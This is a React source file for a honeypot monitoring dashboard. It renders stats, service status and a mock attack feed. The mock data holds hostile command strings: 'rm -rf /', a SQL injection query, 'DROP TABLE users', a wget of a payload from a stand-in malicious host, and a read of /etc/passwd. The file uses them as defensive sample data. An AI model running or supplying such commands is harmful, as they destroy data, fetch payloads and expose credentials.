"use client";

import { motion } from "framer-motion";
import {
    Shield,
    Activity,
    AlertTriangle,
    Users,
    Server,
    Terminal,
    Database,
    Zap,
    ArrowUpRight,
    Clock,
} from "lucide-react";
import { StatCard, StatsGrid } from "@/components/dashboard/stat-card";
import {
    Card,
    CardHeader,
    ServiceBadge,
    RiskBadge,
    LiveIndicator,
    ProgressBar,
} from "@/components/ui/common";
import { cn } from "@/lib/utils";

// Mock data for demonstration
const mockStats = {
    totalAttacks: 2847,
    activeSessions: 12,
    avgRiskScore: 67,
    blockedIPs: 156,
};

const mockRecentAttacks = [
    {
        id: "1",
        service: "ssh" as const,
        command: "rm -rf / --no-preserve-root",
        ip: "192.168.1.45",
        risk: "critical" as const,
        time: "2 min ago",
        mlScore: 0.94,
    },
    {
        id: "2",
        service: "mysql" as const,
        command: "SELECT * FROM users WHERE 1=1 UNION SELECT password FROM admin--",
        ip: "10.0.0.23",
        risk: "high" as const,
        time: "5 min ago",
        mlScore: 0.87,
    },
    {
        id: "3",
        service: "ftp" as const,
        command: "STOR malware.exe",
        ip: "172.16.0.89",
        risk: "high" as const,
        time: "8 min ago",
        mlScore: 0.82,
    },
    {
        id: "4",
        service: "ssh" as const,
        command: "wget http://malicious.com/payload.sh",
        ip: "192.168.2.101",
        risk: "medium" as const,
        time: "12 min ago",
        mlScore: 0.71,
    },
    {
        id: "5",
        service: "mysql" as const,
        command: "DROP TABLE users;",
        ip: "10.0.1.15",
        risk: "critical" as const,
        time: "15 min ago",
        mlScore: 0.96,
    },
];

const mockServiceStats = [
    { service: "SSH", sessions: 5, attacks: 847, status: "active" },
    { service: "FTP", sessions: 3, attacks: 523, status: "active" },
    { service: "MySQL", sessions: 4, attacks: 1477, status: "active" },
];

const sparklineData = [12, 25, 18, 32, 28, 42, 38, 55, 48, 62, 58, 72];

export default function DashboardPage() {
    return (
        <div className="space-y-6">
            {/* Page Title */}
            <div className="flex items-center justify-between">
                <div>
                    <h1 className="text-2xl font-bold">Security Overview</h1>
                    <p className="text-sm text-[var(--muted-foreground)]">
                        Real-time threat monitoring across all honeypot services
                    </p>
                </div>
                <LiveIndicator active={true} label="Live Updates" />
            </div>

            {/* Stats Grid */}
            <StatsGrid>
                <StatCard
                    title="Total Attacks"
                    value={mockStats.totalAttacks.toLocaleString()}
                    change={{ value: 12.5, trend: "up" }}
                    icon={Shield}
                    iconColor="text-red-400"
                    sparkline={sparklineData}
                />
                <StatCard
                    title="Active Sessions"
                    value={mockStats.activeSessions}
                    change={{ value: 3, trend: "up" }}
                    icon={Activity}
                    iconColor="text-emerald-400"
                />
                <StatCard
                    title="Avg Risk Score"
                    value={mockStats.avgRiskScore}
                    suffix="/100"
                    change={{ value: -5.2, trend: "down" }}
                    icon={AlertTriangle}
                    iconColor="text-amber-400"
                />
                <StatCard
                    title="Blocked IPs"
                    value={mockStats.blockedIPs}
                    change={{ value: 8.3, trend: "up" }}
                    icon={Users}
                    iconColor="text-purple-400"
                />
            </StatsGrid>

            {/* Main Content Grid */}
            <div className="grid grid-cols-1 gap-6 lg:grid-cols-3">
                {/* Recent Attacks - Takes 2 columns */}
                <div className="lg:col-span-2">
                    <Card>
                        <CardHeader
                            title="Recent Attack Activity"
                            subtitle="Latest detected threats across all services"
                            action={
                                <button className="btn-secondary text-xs">View All</button>
                            }
                        />

                        <div className="space-y-2">
                            {mockRecentAttacks.map((attack, index) => (
                                <motion.div
                                    key={attack.id}
                                    initial={{ opacity: 0, x: -20 }}
                                    animate={{ opacity: 1, x: 0 }}
                                    transition={{ delay: index * 0.05 }}
                                    className={cn(
                                        "group flex items-center gap-4 rounded-lg border border-transparent p-3 transition-all hover:border-[var(--glass-border)] hover:bg-white/[0.02]",
                                        attack.risk === "critical" && "border-red-500/20 bg-red-500/5"
                                    )}
                                >
                                    {/* Service Badge */}
                                    <ServiceBadge service={attack.service} />

                                    {/* Command */}
                                    <div className="flex-1 overflow-hidden">
                                        <p className="terminal-text truncate text-[var(--foreground)]">
                                            {attack.command}
                                        </p>
                                        <div className="mt-1 flex items-center gap-3 text-xs text-[var(--muted-foreground)]">
                                            <span className="flex items-center gap-1">
                                                <Server className="h-3 w-3" />
                                                {attack.ip}
                                            </span>
                                            <span className="flex items-center gap-1">
                                                <Clock className="h-3 w-3" />
                                                {attack.time}
                                            </span>
                                        </div>
                                    </div>

                                    {/* ML Score */}
                                    <div className="text-right">
                                        <div className="text-sm font-semibold text-[var(--foreground)]">
                                            {(attack.mlScore * 100).toFixed(0)}%
                                        </div>
                                        <div className="text-xs text-[var(--muted-foreground)]">
                                            ML Score
                                        </div>
                                    </div>

                                    {/* Risk Badge */}
                                    <RiskBadge level={attack.risk} animated={attack.risk === "critical"} />

                                    {/* Action */}
                                    <button className="rounded-lg p-1.5 text-[var(--muted-foreground)] opacity-0 transition-all hover:bg-white/5 hover:text-[var(--foreground)] group-hover:opacity-100">
                                        <ArrowUpRight className="h-4 w-4" />
                                    </button>
                                </motion.div>
                            ))}
                        </div>
                    </Card>
                </div>

                {/* Service Status - Takes 1 column */}
                <div className="space-y-6">
                    {/* Active Services */}
                    <Card>
                        <CardHeader
                            title="Service Status"
                            subtitle="Honeypot services health"
                        />
                        <div className="space-y-4">
                            {mockServiceStats.map((service) => (
                                <div key={service.service} className="space-y-2">
                                    <div className="flex items-center justify-between">
                                        <div className="flex items-center gap-2">
                                            {service.service === "SSH" && (
                                                <Terminal className="h-4 w-4 text-cyan-400" />
                                            )}
                                            {service.service === "FTP" && (
                                                <Database className="h-4 w-4 text-purple-400" />
                                            )}
                                            {service.service === "MySQL" && (
                                                <Database className="h-4 w-4 text-amber-400" />
                                            )}
                                            <span className="font-medium">{service.service}</span>
                                        </div>
                                        <div className="flex items-center gap-2">
                                            <span className="text-sm text-[var(--muted-foreground)]">
                                                {service.sessions} sessions
                                            </span>
                                            <div className="h-2 w-2 rounded-full bg-emerald-500" />
                                        </div>
                                    </div>
                                    <ProgressBar
                                        value={service.attacks}
                                        max={2000}
                                        color={
                                            service.attacks > 1000
                                                ? "danger"
                                                : service.attacks > 500
                                                    ? "warning"
                                                    : "primary"
                                        }
                                        showLabel
                                    />
                                    <div className="text-xs text-[var(--muted-foreground)]">
                                        {service.attacks.toLocaleString()} attacks detected
                                    </div>
                                </div>
                            ))}
                        </div>
                    </Card>

                    {/* Quick Actions */}
                    <Card>
                        <CardHeader title="Quick Actions" />
                        <div className="grid grid-cols-2 gap-2">
                            <button className="btn-secondary flex items-center justify-center gap-2 py-3">
                                <Zap className="h-4 w-4" />
                                <span>Generate Report</span>
                            </button>
                            <button className="btn-secondary flex items-center justify-center gap-2 py-3">
                                <Shield className="h-4 w-4" />
                                <span>Block IP</span>
                            </button>
                            <button className="btn-secondary col-span-2 flex items-center justify-center gap-2 py-3">
                                <Activity className="h-4 w-4" />
                                <span>View ML Insights</span>
                            </button>
                        </div>
                    </Card>
                </div>
            </div>

            {/* Terminal Preview */}
            <Card className="overflow-hidden p-0">
                <div className="terminal-header">
                    <div className="terminal-dot bg-red-500" />
                    <div className="terminal-dot bg-amber-500" />
                    <div className="terminal-dot bg-emerald-500" />
                    <span className="ml-3 text-sm text-[var(--muted-foreground)]">
                        Live Attack Feed
                    </span>
                    <LiveIndicator active={true} label="" />
                </div>
                <div className="terminal-body terminal-text max-h-48 space-y-1">
                    <div className="flex gap-2">
                        <span className="text-[var(--muted-foreground)]">[00:41:15]</span>
                        <span className="text-cyan-400">[SSH]</span>
                        <span className="text-emerald-400">192.168.1.45</span>
                        <span>Connected - Starting session</span>
                    </div>
                    <div className="flex gap-2">
                        <span className="text-[var(--muted-foreground)]">[00:41:18]</span>
                        <span className="text-cyan-400">[SSH]</span>
                        <span className="text-emerald-400">192.168.1.45</span>
                        <span>Command: <span className="text-amber-400">ls -la /etc/passwd</span></span>
                    </div>
                    <div className="flex gap-2">
                        <span className="text-[var(--muted-foreground)]">[00:41:22]</span>
                        <span className="text-purple-400">[FTP]</span>
                        <span className="text-emerald-400">10.0.0.23</span>
                        <span>STOR attempt: <span className="text-red-400">malware.exe</span></span>
                    </div>
                    <div className="flex gap-2">
                        <span className="text-[var(--muted-foreground)]">[00:41:25]</span>
                        <span className="text-amber-400">[MySQL]</span>
                        <span className="text-emerald-400">172.16.0.89</span>
                        <span>Query: <span className="text-red-400">SELECT * FROM users WHERE 1=1--</span></span>
                    </div>
                    <div className="flex gap-2">
                        <span className="text-[var(--muted-foreground)]">[00:41:28]</span>
                        <span className="text-cyan-400">[SSH]</span>
                        <span className="text-emerald-400">192.168.1.45</span>
                        <span>⚠️ <span className="text-red-400">CRITICAL:</span> rm -rf / attempted</span>
                    </div>
                </div>
            </Card>
        </div>
    );
}
